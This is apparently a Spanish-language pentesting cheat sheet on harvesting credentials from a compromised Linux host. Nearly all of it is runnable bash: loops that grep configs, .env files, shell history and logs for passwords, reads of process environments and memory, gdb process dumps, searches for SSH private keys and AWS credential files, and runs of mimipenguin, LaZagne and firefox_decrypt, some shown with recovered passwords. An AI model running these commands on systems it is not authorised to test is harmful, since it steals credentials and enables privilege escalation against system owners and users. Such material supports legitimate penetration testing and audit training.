# Búsqueda de Credenciales en Linux

Los sistemas Linux acumulan credenciales en ficheros de configuración, scripts, historiales de shell, variables de entorno, bases de datos y memoria de procesos. Una revisión sistemática tras comprometer un host con privilegios bajos frecuentemente eleva el acceso sin necesidad de exploits. El contexto del sistema importa — un servidor de base de datos aislado tendrá un perfil de credenciales muy diferente al de un servidor web o una estación de trabajo de desarrollo.

### Archivos de configuración

En Linux todo es un archivo, y los servicios guardan sus credenciales en ficheros de configuración con extensiones `.conf`, `.config` y `.cnf`. El siguiente bucle enumera todos los archivos de cada extensión filtrando rutas de librerías y documentación:

```bash
# Enumerar archivos de configuración por extensión
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Buscar credenciales dentro de archivos .cnf (MySQL, OpenSSL, etc.)
for i in $(find / -name "*.cnf" 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: $i"
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "#"
done
```

#### Ubicaciones de alto valor en aplicaciones web

```bash
# Búsqueda amplia en rutas de servicio
grep -r "password\|passwd\|db_pass\|DB_PASS\|secret\|token" \
  /var/www/ /srv/ /opt/ /etc/ 2>/dev/null \
  --include="*.conf" --include="*.php" --include="*.py" \
  --include="*.rb" --include="*.env" --include="*.yaml" --include="*.yml" -l
```

| Aplicación  | Archivo típico                             |
| ----------- | ------------------------------------------ |
| WordPress   | `/var/www/html/wp-config.php`              |
| Joomla      | `/var/www/html/configuration.php`          |
| Drupal      | `/var/www/html/sites/default/settings.php` |
| Laravel     | `/var/www/html/.env`                       |
| Django      | `settings.py` (buscar `DATABASES`)         |
| Generic PHP | `config.php`, `database.php`, `db.php`     |

### Bases de datos locales

```bash
# Buscar archivos de base de datos por extensión
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done

# MySQL — acceso directo y configuraciones
mysql -u root -e "SELECT User,Password FROM mysql.user;" 2>/dev/null
cat /etc/mysql/debian.cnf     # credenciales de mantenimiento en texto claro
cat ~/.my.cnf

# PostgreSQL
cat /etc/postgresql/*/main/pg_hba.conf
cat ~/.pgpass
psql -U postgres -c "\du" 2>/dev/null
```

> 💡 Los archivos `cert9.db` y `key4.db` de Firefox en `~/.mozilla/firefox/*/` son bases de datos de credenciales del navegador — ver sección de credenciales de navegador más abajo.

### Notas y scripts

```bash
# Buscar archivos de texto y archivos sin extensión en homes
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Buscar scripts con credenciales hardcodeadas
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

### Cronjobs

Los cronjobs que se autentican contra servicios frecuentemente tienen credenciales hardcodeadas en el script o directamente en la definición del cron:

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
crontab -l    # cron del usuario actual
```

### Historial de shell y logs

#### Historial de comandos

```bash
# Historial de todos los usuarios
tail -n 20 /home/*/.bash_history
find /home /root -name ".*_history" 2>/dev/null -exec cat {} \;

# Buscar credenciales en el historial
grep -i "pass\|secret\|token\|key\|ssh\|mysql\|psql\|curl\|wget" ~/.bash_history
```

El historial puede revelar comandos como `/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK` donde la contraseña se pasa como argumento, o `mysql -u root -pPassword123` con la contraseña inline.

#### Logs del sistema

```bash
# Buscar eventos de autenticación, sudo y credenciales en todos los logs
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: $i"
    echo "$GREP"
  fi
done
```

| Log                                   | Contenido                     |
| ------------------------------------- | ----------------------------- |
| `/var/log/auth.log`                   | Autenticación (Debian/Ubuntu) |
| `/var/log/secure`                     | Autenticación (RedHat/CentOS) |
| `/var/log/faillog`                    | Intentos de login fallidos    |
| `/var/log/cron`                       | Ejecuciones de cronjobs       |
| `/var/log/httpd` / `/var/log/apache2` | Logs de Apache                |
| `/var/log/mysqld.log`                 | Logs de MySQL                 |

### Archivos .env y variables de entorno

```bash
# Buscar archivos .env
find / -name ".env" -readable 2>/dev/null
find / -name "*.env" -readable 2>/dev/null

# Variables de entorno del proceso actual
env | grep -i "pass\|secret\|token\|key\|api"

# Variables de entorno de todos los procesos en ejecución
for pid in /proc/*/environ; do
  cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|token"
done
```

### Claves SSH privadas

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null | xargs grep -l "PRIVATE KEY" 2>/dev/null

# Mapear qué hosts tienen acceso via authorized_keys
find /home /root -name "authorized_keys" 2>/dev/null -exec cat {} \;
```

Si una clave privada no tiene passphrase, da acceso directo. Si está cifrada, procesar con `ssh2john` + Hashcat/John.

### Configuraciones de clientes

```bash
cat ~/.ssh/config           # hosts, usuarios y claves por host
cat ~/.pgpass               # credenciales PostgreSQL en texto claro
cat ~/.my.cnf               # credenciales MySQL
cat ~/.aws/credentials      # credenciales AWS
cat ~/.boto                 # AWS legacy
cat ~/.azure/credentials

# WiFi — PSK en texto claro
cat /etc/NetworkManager/system-connections/*

# Mounts con credenciales
cat /etc/fstab              # puede incluir credenciales CIFS/NFS
```

### Memoria de procesos

Con privilegios de root, la memoria de procesos activos puede contener credenciales en texto claro:

```bash
# Strings en memoria de todos los procesos
for pid in $(ps aux | grep -v grep | awk '{print $2}'); do
  strings /proc/$pid/mem 2>/dev/null | grep -i "password\|passwd" | head -5
done

# Volcado de proceso específico con gdb
gdb -p <PID> --batch -ex "gcore /tmp/proc.dump"
strings /tmp/proc.dump | grep -i "password"
```

### Herramientas automatizadas

#### Mimipenguin — credenciales en memoria (requiere root)

```bash
sudo python3 mimipenguin.py
# [SYSTEM - GNOME]  cry0l1t3:WLpAEXFa0SbqOHY
```

Extrae credenciales de sesiones GNOME, procesos de autenticación y otros servicios activos directamente desde memoria.

#### LaZagne

Cubre una lista extensa de fuentes en Linux:

```bash
sudo python3 laZagne.py all
python3 laZagne.py browsers
python3 laZagne.py sysadmin
```

Fuentes que cubre en Linux: WiFi, wpa\_supplicant, libsecret, kwallet, navegadores Chromium, Firefox, Thunderbird, git, variables de entorno, grub, fstab, AWS, FileZilla, gFTP, SSH, Apache, `/etc/shadow`, Docker, KeePass, keyrings de sistema.

### Credenciales de navegadores

#### Firefox

Firefox guarda las credenciales cifradas en `logins.json`:

```bash
# Localizar el perfil
ls -l ~/.mozilla/firefox/ | grep default

# Ver el archivo de credenciales cifradas
cat ~/.mozilla/firefox/*.default-release/logins.json | jq .
```

Descifrar con `firefox_decrypt`:

```bash
python3.9 firefox_decrypt.py
# Website:   https://www.inlanefreight.com
# Username: 'cry0l1t3'
# Password: 'FzXUxJemKm6g2lGh'
```

#### LaZagne para navegadores

```bash
python3 laZagne.py browsers
# Devuelve credenciales de Firefox, Chromium y otros navegadores soportados
```

> Los archivos `.env` con credenciales de producción en servidores web son uno de los hallazgos más frecuentes y de mayor impacto en auditorías reales. Siempre revisar la raíz del documento web y directorios de aplicación.
